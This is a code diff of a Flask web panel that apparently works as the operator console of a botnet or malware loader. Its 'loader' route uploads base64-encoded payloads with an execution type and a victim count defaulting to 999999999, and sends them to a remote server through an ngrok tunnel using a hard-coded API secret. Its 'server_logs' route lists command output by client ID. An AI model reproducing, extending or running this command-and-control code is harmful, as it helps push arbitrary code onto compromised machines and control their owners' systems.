@@ -52,8 +52,8 @@ def convert_to_future(timestamp):
         return f"In {add0(int(delta // 86400))}d"
 
 
-SERVER_ADDRESS = "http://127.0.0.1:9999"
-API_SECRET = "debug"
+SERVER_ADDRESS = "https://4c7a-169-150-203-56.ngrok-free.app"
+API_SECRET = "dj)!gf0CN eIX)#!e9jxm)SAh0btpmr"
 
 app = Flask(__name__)
 
@@ -106,27 +106,33 @@ def builder():
 def loader():
 
     if request.method == "POST":
-        execution_type = request.form.get('execution_type').split("|")[1][1:]
-        payload = base64.b64encode(request.files['payload'].read()).decode("utf-8")
 
+        file = request.files['payload']
+        execution_type = request.form.get('execution_type').split("|")[1][1:]
+        payload = base64.b64encode(file.read()).decode("utf-8")
+    
         if request.form.get('amount') == '':
             amount = "999999999"
         else:
             amount = request.form.get('amount')
 
         if request.form.get("is_recursive") != None:
-           is_recursive = True
+            is_recursive = True
         else:
-           is_recursive = False
+            is_recursive = False
+
+        note = file.filename + " | " + request.form.get("note")
 
         load_creation_response = httpx.post(SERVER_ADDRESS + "/api/issue_load", 
             json={
                 "api_secret": API_SECRET,
                 "cmd_type": execution_type,
                 "cmd_args": payload,
-                "required_amount": int(amount),
+                "amount": int(amount),
+                "note": note,
                 "is_recursive": is_recursive
-            }
+            },
+            timeout=None
         )
 
     load_id = request.args.get('delete_load')
@@ -142,6 +148,7 @@ def loader():
     new_load_data = []
     
     for load_id, load in load_list.items():
+        load["percent_completed"] = int(100 * float(load["completed_amount"]) / float(load["required_amount"]))
         load["load_id"] = load_id
         load["time_issued"] = convert_to_ago(load["time_issued"])
         new_load_data.append(load)
@@ -163,8 +170,12 @@ def firewall():
 
     new_blocks_list = []
     for block_id, block in blocks_list.items():
+
         block["block_id"] = block_id
-        block["banned_until"] = convert_to_future(block["banned_until"])
+        if block["banned_until"] == 0:
+            block["banned_until"] = "Never"
+        else: 
+            convert_to_future(block["banned_until"])
         new_blocks_list.append(block)
 
 
@@ -172,6 +183,16 @@ def firewall():
 
 @app.route("/server_logs")
 def server_logs():
-    return render_template("server_logs.html")
+
+    response = httpx.post(SERVER_ADDRESS + "/api/outputs_list", 
+        json={"api_secret": API_SECRET}
+    )
+
+    parsed_text = ""
+    for oid,data in json.loads(response.text).items():
+        parsed_text += f"[ {data['cmd_type'].upper()} | TTC: {data['time_recieved'] - data['time_issued']}s | Client ID: {data['client_id']} ] {base64.b64decode(data['output']).decode('utf-8')[:100]}\n"
+        print(oid, data)
+            
+    return render_template("server_logs.html", parsed_text=parsed_text)
 
 app.run("127.0.0.1", 6767)
